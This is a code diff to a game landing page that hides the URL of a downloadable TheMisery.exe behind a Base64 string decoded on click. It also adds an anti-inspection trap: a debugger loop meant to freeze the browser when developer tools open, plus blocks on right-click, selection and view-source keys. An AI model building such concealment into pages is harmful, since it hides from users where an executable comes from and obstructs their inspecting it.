@@ -50,7 +50,7 @@
         .nav-links { display: flex; gap: 40px; }
         nav a { color: #fff; text-decoration: none; font-size: 13px; letter-spacing: 3px; text-transform: uppercase; font-weight: 900; transition: 0.3s; }
         nav a:hover { color: #836fff; }
-        .top-dl { background: #836fff; color: #000; padding: 8px 20px; text-decoration: none; font-weight: 900; font-size: 11px; letter-spacing: 2px; transition: 0.3s; }
+        .top-dl { background: #836fff; color: #000; padding: 8px 20px; text-decoration: none; font-weight: 900; font-size: 11px; letter-spacing: 2px; transition: 0.3s; cursor: pointer; }
         .top-dl:hover { background: #fff; transform: scale(1.1); box-shadow: 0 0 20px #836fff; }
 
         .container { max-width: 1100px; margin: 0 auto; padding: 0 40px; }
@@ -60,7 +60,7 @@
         #home { height: 75vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .the-text { font-size: 38px; font-weight: 900; letter-spacing: 22px; color: #836fff; margin-bottom: -15px; margin-left: 22px; opacity: 0.9; }
         h1 { font-size: clamp(60px, 12vw, 150px); letter-spacing: 45px; font-weight: 900; margin-right: -45px; text-shadow: 0 0 40px rgba(131,111,255,0.5); margin-bottom: 40px; }
-        .main-dl { background: #836fff; color: #000; padding: 18px 60px; text-decoration: none; font-weight: 900; font-size: 16px; letter-spacing: 4px; transition: 0.3s; border-radius: 2px; }
+        .main-dl { background: #836fff; color: #000; padding: 18px 60px; text-decoration: none; font-weight: 900; font-size: 16px; letter-spacing: 4px; transition: 0.3s; border-radius: 2px; cursor: pointer; }
         .main-dl:hover { background: #fff; transform: scale(1.05); box-shadow: 0 0 30px #836fff; }
 
         .gameplay-container { width: 100%; max-width: 900px; margin: 0 auto; border: 2px solid #1a1a1a; position: relative; cursor: pointer; background: #000; transition: 0.4s; }
@@ -104,14 +104,14 @@
         <div class="nav-links">
             <a href="#home">Home</a><a href="#gameplay">Gameplay</a><a href="#story">Story</a><a href="#features">Features</a><a href="#gallery">Archives</a>
         </div>
-        <a href="https://www.dropbox.com/scl/fi/m3de2miscz545h2q9r0qo/TheMisery.exe?rlkey=z0jlpqvrrns7z2qqsi4p1gwgo&st=tk5pvfje&dl=1" class="top-dl">DOWNLOAD NOW</a>
+        <div onclick="initDownload()" class="top-dl">DOWNLOAD NOW</div>
     </nav>
 
     <div class="container">
         <section id="home">
             <div class="the-text">THE</div>
             <h1>MISERY</h1>
-            <a href="https://www.dropbox.com/scl/fi/m3de2miscz545h2q9r0qo/TheMisery.exe?rlkey=z0jlpqvrrns7z2qqsi4p1gwgo&st=tk5pvfje&dl=1" class="main-dl">DOWNLOAD NOW</a>
+            <div onclick="initDownload()" class="main-dl">DOWNLOAD NOW</div>
         </section>
 
         <section id="gameplay">
@@ -191,12 +191,26 @@
     </div>
 
     <script>
+        // AGRESİF KORUMA: Konsol açılırsa tarayıcıyı dondurur
+        setInterval(function() { debugger; }, 100);
+
+        // SAĞ TIK VE SEÇME ENGELİ
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+
+        // TUŞ KOMBİNASYONLARI ENGELİ
         document.onkeydown = function(e) {
-            if(e.keyCode == 123) return false;
-            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+            // F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S engeli
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0))) return false;
         }
 
+        // GİZLİ İNDİRME SİSTEMİ (Link Base64 olarak kodun içine gömüldü)
+        function initDownload() {
+            const _0x836 = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL20zZGUybWlzY3o1NDVoMnE5cjBxby9UaGVNaXNlcnkuZXhlP3Jsa2V5PXowamxwcXZycm5zN3oycXFzaTRwMWd3Z28mc3Q9dGs1cHZmamUmZGw9MQ==";
+            window.location.href = atob(_0x836);
+        }
+
+        // SLIDER SİSTEMİ
         let currentSlide = 0;
         const track = document.getElementById('track');
         const slides = document.querySelectorAll('.slide');
@@ -205,6 +219,7 @@
             track.style.transform = `translateX(-${currentSlide * 100}%)`;
         }
 
+        // VİDEO SİSTEMİ
         const vidBox = document.getElementById('vidBox');
         const gameVid = document.getElementById('gameVid');
         if(vidBox && gameVid) {
